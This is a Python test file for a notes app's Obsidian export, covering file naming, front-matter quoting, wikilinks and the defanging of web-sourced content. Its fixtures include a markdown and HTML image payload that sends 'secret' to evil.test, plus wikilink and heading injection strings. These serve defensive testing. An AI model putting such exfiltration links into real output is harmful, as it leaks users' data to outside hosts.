"""What the Obsidian export writes (pure): names, front matter, wikilinks, journals."""

from __future__ import annotations

from datetime import date
from decimal import Decimal

from roost.journal.models import JournalDay
from roost.money.models import Expense, Project
from roost.notes.models import Note
from roost.tasks.models import Step, Task
from roost.vault_export.names import file_name, unique_names
from roost.vault_export.render import ProjectBundle, journal_files, project_files
from roost.vault_export.yaml import front_matter

P = "Roost/Projects/Garden 2026"


def _project(**over) -> Project:
    base = dict(id="p1", user_id="u", name="Garden 2026", budget=Decimal("300"), currency="EUR", created_at="1",
                updated_at="1", created_by_bot=None, tainted=False, color="#64748b", start_date=None,
                due_date="2026-12-01", monthly_budget=None, lead_bot_id=None, status="active")
    return Project(**{**base, **over})


def _task(task_id: str, title: str, **over) -> Task:
    base = dict(id=task_id, user_id="u", title=title, description=None, category=None, priority="medium",
                status="todo", owner="user", due_date=None, reminder_at=None, pre_reminders=(), recurring=None,
                recur_until=None, tags=(), steps=(), created_at=task_id, updated_at="1", completed_at=None,
                created_by_bot=None, tainted=False, project_id="p1")
    return Task(**{**base, **over})


def _note(note_id: str, title: str, content: str, **over) -> Note:
    base = dict(id=note_id, user_id="u", title=title, content=content, tags=(), pinned=False, revision=1,
                created_at=note_id, updated_at="1", created_by_bot=None, tainted=False, project_id="p1")
    return Note(**{**base, **over})


def _expense(**over) -> Expense:
    base = dict(id="e1", user_id="u", project_id="p1", amount=Decimal("12.5"), currency="EUR", description="Seeds",
                vendor="Shop | Co", spent_at="2026-10-20", status="posted", created_at="1", updated_at="1",
                created_by_bot="b", tainted=False, tags=("bot:penny", "seeds"))
    return Expense(**{**base, **over})


def _by_path(files) -> dict[str, str]:
    return {f.path: f.text for f in files}


def test_file_names_are_safe_and_never_empty():
    assert file_name('Buy: seeds / "roses"? #now') == "Buy seeds roses now"
    assert file_name("...") == "Untitled" and file_name(".hidden") == "hidden"
    assert file_name("id_rsa") == "Roost id_rsa" and file_name("prod.env") == "Roost prod.env"
    assert len(file_name("x" * 300)) == 80


def test_unique_names_number_repeats_case_blind():
    assert unique_names([("a", "Dig"), ("b", "dig"), ("c", "Dig")]) == {"a": "Dig", "b": "dig (2)", "c": "Dig (3)"}


def test_front_matter_quotes_every_string_and_skips_nones():
    text = front_matter([("title", 'a "b"\n---\nc: d'), ("n", 2), ("ok", True), ("gone", None), ("bad key", "x"),
                         ("tags", ["roost/task", "bot/ana"])])
    assert text == ('---\ntitle: "a \\"b\\"\\n---\\nc: d"\nn: 2\nok: true\ntags: ["roost/task", "bot/ana"]\n---\n')


def test_a_project_with_its_tasks_notes_and_money():
    bundle = ProjectBundle(
        project=_project(),
        tasks=(_task("t1", "Buy seeds", due_date="2026-10-30T09:00:00+01:00", tags=("bot:penny", "project:garden"),
                     steps=(Step("s1", "Pick", True), Step("s2", "Pay", False)), description="From the shop"),
               _task("t2", "Buy seeds", status="done", tainted=True)),
        notes=(_note("n1", "Roses", "---\nmood: happy\ntags: [x]\n---\nRed ones.", tags=("bot:ana", "x")),),
        expenses=(_expense(), _expense(id="e2", kind="income", amount=Decimal("5"), description=None, vendor=None,
                                      tags=())),
    )
    files = _by_path(project_files([bundle]))
    assert sorted(files) == sorted([f"{P}/Garden 2026.md", f"{P}/Garden 2026 · Money.md", f"{P}/Tasks/Buy seeds.md",
                                    f"{P}/Tasks/Buy seeds (2).md", f"{P}/Notes/Roses.md"])
    project = files[f"{P}/Garden 2026.md"]
    assert 'tags: ["roost/project", "project/garden-2026"]' in project and 'budget: "300.00"' in project
    assert f"- [ ] [[{P}/Tasks/Buy seeds|Buy seeds]] 📅 2026-10-30" in project
    assert f"- [x] [[{P}/Tasks/Buy seeds (2)|Buy seeds]]" in project and f"[[{P}/Notes/Roses|Roses]]" in project
    task = files[f"{P}/Tasks/Buy seeds.md"]
    assert 'tags: ["roost/task", "bot/penny", "project/garden"]' in task
    assert "- [x] Pick\n- [ ] Pay" in task and "From the shop" in task
    assert f'project: "[[{P}/Garden 2026|Garden 2026]]"' in task
    assert "from_web: true" in files[f"{P}/Tasks/Buy seeds (2).md"]
    note = files[f"{P}/Notes/Roses.md"]
    assert note.count("---\n") == 2 and 'mood: "happy"' in note and "Red ones." in note
    assert 'tags: ["roost/note", "bot/ana", "x"]' in note
    money = files[f"{P}/Garden 2026 · Money.md"]
    assert "| 2026-10-20 | Seeds | Shop / Co | 12.50 EUR | posted | #bot/penny #seeds |" in money
    assert "| +5.00 EUR |" in money


def test_two_projects_with_one_name_get_two_folders_and_an_empty_one_says_so():
    files = _by_path(project_files([ProjectBundle(_project(), (), (), ()),
                                    ProjectBundle(_project(id="p2", created_at="2"), (), (), ())]))
    assert f"{P}/Garden 2026.md" in files and "Roost/Projects/Garden 2026 (2)/Garden 2026 (2).md" in files
    assert "- (none)" in files[f"{P}/Garden 2026.md"] and "No expenses yet." in files[f"{P}/Garden 2026 · Money.md"]


def test_journal_days_go_under_each_bots_folder():
    day = JournalDay("j", "u", "b1", date(2026, 10, 22), "---\n---\n# Ana\n", False, 1, "t", "t")
    other = JournalDay("k", "u", "gone", date(2026, 10, 21), "x", False, 1, "t", "t")
    files = _by_path(journal_files([day, other], {"b1": "Ana"}))
    assert files == {"Roost/Journals/Ana/2026-10-22.md": "---\n---\n# Ana\n",
                     "Roost/Journals/Retired bot/2026-10-21.md": "x"}


EVIL = 'See ![x](https://evil.test/?d=secret) and <img src="https://evil.test/a.png"> and [[Other]] `x` ~~~js'


def _assert_defanged(text: str) -> None:
    assert "![" not in text and "<img" not in text and "](https://" not in text and "[[Other]]" not in text
    assert "`https://evil.test/?d=secret)`" in text or "`https://evil.test/?d=secret`" in text
    assert "~~~" not in text


def test_a_web_tainted_journal_day_is_defanged_and_a_clean_one_kept():
    head = '---\ntags: ["roost/journal", "bot/ana"]\n---\n# Ana · 2026-10-22\n\n'
    tainted = JournalDay("j", "u", "b1", date(2026, 10, 22), head + f"- 09:00 {EVIL}\n", True, 1, "t", "t")
    clean = JournalDay("k", "u", "b1", date(2026, 10, 21), head + "- 09:00 ![ok](https://me.test/a.png)\n",
                       False, 1, "t", "t")
    files = _by_path(journal_files([tainted, clean], {"b1": "Ana"}))
    text = files["Roost/Journals/Ana/2026-10-22.md"]
    assert text.startswith(head) and "- 09:00 See" in text
    _assert_defanged(text)
    assert files["Roost/Journals/Ana/2026-10-21.md"].endswith("![ok](https://me.test/a.png)\n")


def test_web_tainted_notes_tasks_and_money_are_defanged():
    bundle = ProjectBundle(
        project=_project(),
        tasks=(_task("t1", "Read", tainted=True, description=EVIL, steps=(Step("s1", EVIL, False),)),),
        notes=(_note("n1", "Web", f"---\nmood: x\n---\n{EVIL}\n", tainted=True),),
        expenses=(_expense(tainted=True, description=EVIL),),
    )
    files = _by_path(project_files([bundle]))
    for path in (f"{P}/Tasks/Read.md", f"{P}/Notes/Web.md"):
        _assert_defanged(files[path])
    _assert_defanged(files[f"{P}/Garden 2026 · Money.md"])


def test_titles_cannot_break_out_of_a_wikilink_or_a_heading():
    bundle = ProjectBundle(_project(), (_task("t1", "a]] [[evil|x\n# Boom <img src=x>"),), (), ())
    files = _by_path(project_files([bundle]))
    project = files[f"{P}/Garden 2026.md"]
    line = next(row for row in project.splitlines() if row.startswith("- [ ] "))
    assert line.count("[[") == 1 and line.count("]]") == 1 and line.count("|") == 1 and "<img" not in line
    task = next(text for path, text in files.items() if "/Tasks/" in path)
    heading = next(row for row in task.splitlines() if row.startswith("# "))
    assert "\n# Boom" not in task and "]]" not in heading and "<img" not in heading


def test_a_project_named_money_keeps_its_note_and_its_money_apart():
    for name in ("Money", "money"):
        files = project_files([ProjectBundle(_project(name=name), (), (), (_expense(),))])
        paths = [f.path for f in files]
        assert len(paths) == len({p.casefold() for p in paths})
        base = f"Roost/Projects/{name}"
        assert f"{base}/{name}.md" in paths and f"{base}/{name} · Money.md" in paths
